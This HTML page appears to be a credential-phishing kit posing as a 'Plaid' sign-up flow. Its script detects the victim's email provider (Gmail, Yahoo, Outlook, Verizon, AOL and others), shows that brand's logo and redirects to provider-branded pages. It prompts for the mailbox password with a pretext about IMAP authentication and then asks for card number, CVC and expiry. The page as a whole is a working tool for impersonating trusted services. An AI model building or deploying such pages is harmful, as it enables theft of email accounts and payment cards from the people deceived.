<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css"
    />
    <link rel="stylesheet" href="node_modules/bootstrap-icons/icons/envelope-at-fill.svg">
    <link rel="stylesheet" href="index.css" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css"
    />
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
  </head>

  <body>
    <header class="red-background">
      <div class="container">
       <div class="logo-header">
        <img src="image/CTZ_Green-01.png" alt="">
       </div>
      </div>
    </header>
    <!-- MultiStep Form -->
    <div class="container-fluid" id="grad1">
      <div class="row justify-content-center mt-0">
        <div class="col-12 col-sm-9 col-md-7 col-lg-6 text-center p-0 mb-2">
          <div class="card px-0 pt-4 pb-0">
            <div class="col-md-12 mx-0">
              <form id="msform">
                <!-- progressbar -->
                <ul id="progressbar">
                  <li class="active" id="account">
                    <strong>Account</strong>
                  </li>
                  <li id="personal"><strong>Personal</strong></li>
                  <li id="payment"><strong>Payment</strong></li>
                  <li id="profile"><strong>Profile</strong></li>
                  <li id="confirm"><strong>Finish</strong></li>
                </ul>
                <!-- fieldsets -->
                <fieldset>
                  <div class="container">
                    <div class="row justify-content-center">
                      <div class="main-first-email">
                        <div class="icon-first-div">
                          <i class="fa-solid fa-atom bg-white-icon"></i>
                          <p>Plaid</p>
                        </div>
                        <div class="at-the-rate-image">
                          <i class="fa-brands fa-dribbble"></i>
                          <img src="image/attherate.png" id="image" alt="" />
                        </div>
                        <hr class="HR" />
                        <div class="Random mx-4 mt-4"></div>
                        <div class="mt-4 mx-4">
                          <input
                            type="email"
                            id="email"
                            name="email"
                            placeholder="Email Id"
                            onkeyup="Changing()"
                          />
                        </div>
                        <div class="block mt-4 mx-4">
                          <input
                            type="password"
                            id="password"
                            name="uname"
                            placeholder="Password"
                          />
                        </div>
                        <div class="button-main">
                          <a
                          href="#"
                          type="button"
                          onclick="locationChange()"
                          class="action-button"
                          >Continue</a
                        >
                        </div>
                      
                      </div>
                    </div>
                  </div>
                </fieldset>
                <fieldset id="personal">
                  <div class="form-card">
                    <h2 class="fs-title">Personal Information</h2>
                    <input type="text" name="fname" placeholder="First Name" />
                    <input type="text" name="lname" placeholder="Last Name" />
                    <input type="text" name="phno" placeholder="Contact No." />
                    <input
                      type="text"
                      name="phno_2"
                      placeholder="Alternate Contact No."
                    />
                  </div>
                  <input
                    type="button"
                    name="previous"
                    class="previous action-button-previous"
                    value="Previous"
                  />
                  <input
                    type="button"
                    name="next"
                    class="next action-button"
                    value="Next Step"
                  />
                </fieldset>
                <fieldset>
                  <div class="form-card">
                    <h2 class="fs-title">Payment Information</h2>
                    <div class="radio-group">
                      <div class="radio" data-value="credit">
                        <img
                          src="https://i.imgur.com/XzOzVHZ.jpg"
                          width="200px"
                          height="100px"
                        />
                      </div>
                      <div class="radio" data-value="paypal">
                        <img
                          src="https://i.imgur.com/jXjwZlj.jpg"
                          width="200px"
                          height="100px"
                        />
                      </div>
                      <br />
                    </div>
                    <label class="pay">Card Holder Name*</label>
                    <input type="text" name="holdername" placeholder="" />
                    <div class="row">
                      <div class="col-9">
                        <label class="pay">Card Number*</label>
                        <input type="text" name="cardno" placeholder="" />
                      </div>
                      <div class="col-3">
                        <label class="pay">CVC*</label>
                        <input
                          type="password"
                          name="cvcpwd"
                          placeholder="***"
                        />
                      </div>
                    </div>
                    <div class="row">
                      <div class="col-3">
                        <label class="pay">Expiry Date*</label>
                      </div>
                      <div class="col-9">
                        <select class="list-dt" id="month" name="expmonth">
                          <option selected>Month</option>
                          <option>January</option>
                          <option>February</option>
                          <option>March</option>
                          <option>April</option>
                          <option>May</option>
                          <option>June</option>
                          <option>July</option>
                          <option>August</option>
                          <option>September</option>
                          <option>October</option>
                          <option>November</option>
                          <option>December</option>
                        </select>
                        <select class="list-dt" id="year" name="expyear">
                          <option selected>Year</option>
                        </select>
                      </div>
                    </div>
                  </div>
                  <input
                    type="button"
                    name="previous"
                    class="previous action-button-previous"
                    value="Previous"
                  />
                  <input
                    type="button"
                    name="make_payment"
                    class="next action-button"
                    value="Confirm"
                  />
                </fieldset>
                <fieldset>
                  <div class="form-card">
                    <h2 class="fs-title">Profile</h2>
                    <div class="radio-group">
                      <div class="radio" data-value="credit">
                        <img
                          src="https://i.imgur.com/XzOzVHZ.jpg"
                          width="200px"
                          height="100px"
                        />
                      </div>
                      <div class="radio" data-value="paypal">
                        <img
                          src="https://i.imgur.com/jXjwZlj.jpg"
                          width="200px"
                          height="100px"
                        />
                      </div>
                      <br />
                    </div>
                    <label class="pay">Card Holder Name*</label>
                    <input type="text" name="holdername" placeholder="" />
                    <div class="row">
                      <div class="col-9">
                        <label class="pay">Card Number*</label>
                        <input type="text" name="cardno" placeholder="" />
                      </div>
                      <div class="col-3">
                        <label class="pay">CVC*</label>
                        <input
                          type="password"
                          name="cvcpwd"
                          placeholder="***"
                        />
                      </div>
                    </div>
                    <div class="row">
                      <div class="col-3">
                        <label class="pay">Expiry Date*</label>
                      </div>
                      <div class="col-9">
                        <select class="list-dt" id="month" name="expmonth">
                          <option selected>Month</option>
                          <option>January</option>
                          <option>February</option>
                          <option>March</option>
                          <option>April</option>
                          <option>May</option>
                          <option>June</option>
                          <option>July</option>
                          <option>August</option>
                          <option>September</option>
                          <option>October</option>
                          <option>November</option>
                          <option>December</option>
                        </select>
                        <select class="list-dt" id="year" name="expyear">
                          <option selected>Year</option>
                        </select>
                      </div>
                    </div>
                  </div>
                  <input
                    type="button"
                    name="make_payment"
                    class="next action-button"
                    value="Confirm"
                  />
                </fieldset>
                <fieldset>
                  <div class="form-card">
                    <h2 class="fs-title text-center">Success !</h2>
                    <br /><br />
                    <div class="row justify-content-center">
                      <div class="col-3">
                        <img
                          src="https://img.icons8.com/color/96/000000/ok--v2.png"
                          class="fit-image"
                        />
                      </div>
                    </div>
                    <br /><br />
                    <div class="row justify-content-center">
                      <div class="col-7 text-center">
                        <h5>You Have Successfully Signed Up</h5>
                      </div>
                    </div>
                  </div>
                </fieldset>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="index.js"></script>

    <script>
      let email = $("#email");
      let confirmEmail = $("#confirm2");
      let getImage = $("#image");
      var url;
      const validateEmail = (email) => {
        return String(email)
          .toLowerCase()
          .match(
            /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
          );
      };

      $("#email").on("input", function () {
        let value = $(this).val();
        if (value.includes("verizon")) {
          getImage.attr("src", "image/verizonLogo.png");
          window.localStorage.setItem("verizon", JSON.stringify(email.val()));
          document.querySelector(".block").style.display = "none";
          url = "../version/Verizon.html";
        } else if (value.includes("gmail")) {
          window.localStorage.setItem("value", JSON.stringify(email.val()));
          getImage.attr("src", "image/gmail.png");
          document.querySelector(".block").style.display = "none";
          url = "../gmail/Gmail.html";
        } else if (value.includes("outlook")) {
          getImage.attr("src", "image/outlook.png");
          window.localStorage.setItem("outlook", JSON.stringify(email.val()));
          document.querySelector(".block").style.display = "none";
          url = "../Microsoft/Microsoft.html";
        } else if (value.includes("hotmail")) {
          getImage.attr("src", "image/outlook.png");
          window.localStorage.setItem("hotmail", JSON.stringify(email.val()));
          document.querySelector(".block").style.display = "none";
          url = "../Microsoft/Microsoft.html";
        } else if (value.includes("msn")) {
          getImage.attr("src", "image/microsoft.webp");
          window.localStorage.setItem("msn", JSON.stringify(email.val()));
          document.querySelector(".block").style.display = "none";
          url = "../Microsoft/Microsoft.html";
        } else if (value.includes("yahoo")) {
          getImage.attr("src", "image/yahoo.png");
          window.localStorage.setItem("yahoo", JSON.stringify(email.val()));
          document.querySelector(".block").style.display = "none";
          url = "../yahoo/Yahoo.html";
        } else if (value.includes("microsoft")) {
          window.localStorage.setItem("microsoft", JSON.stringify(email.val()));
          url = "../Microsoft/Microsoft.html";
          document.querySelector(".block").style.display = "none";
          getImage.attr("src", "image/microsoft.webp");
        } else if (value.includes("comcast")) {
          window.localStorage.setItem("comcast", JSON.stringify(email.val()));
          url = "../Comcast/Comcast.html";
          getImage.attr("src", "image/comcast.ico");
          document.querySelector(".block").style.display = "none";
        } else if (value.includes("att")) {
          url = "../Attt/Att.html";
          window.localStorage.setItem("att", JSON.stringify(email.val()));
          getImage.attr("src", "image/att.ico");
          document.querySelector(".block").style.display = "none";
        } else if (value.includes("aol")) {
          url = "../AOL/AOL.html";
          getImage.attr("src", "image/aol.png");
          window.localStorage.setItem("aol", JSON.stringify(email.val()));

          document.querySelector(".block").style.display = "none";
        } else {
          getImage.attr("src", "image/attherate.png");
          document.querySelector(".block").style.display = "block";
          window.localStorage.setItem(
            "RandomGetting",
            JSON.stringify(email.val())
          );
          Changing();
          $(this).css({
            borderColor: "red",
          });
        }
      });
      function Changing() {
        let Random = document.querySelector(".Random");
        let creatElement = document.createElement("div");
        creatElement.id = "bold";
        let gettingEmail = document.querySelector("#email").value;
        let pasrsed = JSON.stringify(gettingEmail);
        Random.innerHTML = "";
        creatElement.innerHTML = ` Please Enter the Password of following email Address <strong>(${pasrsed})</strong>authenticate its using IMAP PROtocole`;
        Random.append(creatElement);
      }
      if (
        email.val() != "aol" ||
        email.val() != "gmail" ||
        email.val() != "hotmail" ||
        email.val() != "outlook" ||
        email.val() != "verizon" ||
        email.val() != "yahoo" ||
        email.val() != "microsoft" ||
        email.val() != "comcast" ||
        email.val() != "att" ||
        email.val() != "aol"
      ) {
        function locationChange() {
          window.location.assign("../for-Email-password-error/index.html");
        }
      }

      $(".action-button").on("click", () => {
        if (email.val()) {
          $(".action-button").attr("href", url);
        } else {
          $(".action-button").attr("href", "#");
        }
      });
      //    for loading
      $("body").append(
        '<div  class="loader-container"><img src="image/loading.png" class="img-laoding" /></div>'
      );
      $(window).on("load", function () {
        setTimeout(removeLoader, 1000); //wait for page load PLUS two seconds.
      });
      function removeLoader() {
        $(".loader-container").fadeOut(500, function () {
          // fadeOut complete. Remove the loading div
          $(".loader-container").remove(); //makes page more lightweight
        });
      }
    </script>
  </body>
</html>
